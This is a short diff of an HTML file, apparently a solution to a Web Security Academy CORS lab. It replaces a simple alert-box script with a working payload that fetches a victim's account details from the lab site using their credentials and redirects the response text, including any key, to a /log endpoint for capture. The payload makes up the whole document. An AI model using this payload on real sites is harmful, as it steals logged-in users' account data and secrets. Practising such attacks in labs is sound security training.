@@ -1,3 +1,11 @@
-<h1>mendeleeano1907</h1>
-<script>alert("Hello World !")</script>
-<!-- POC BY MENDELEEANO1907 -->
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0ab3009c04d472a98196d5d5009100c7.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
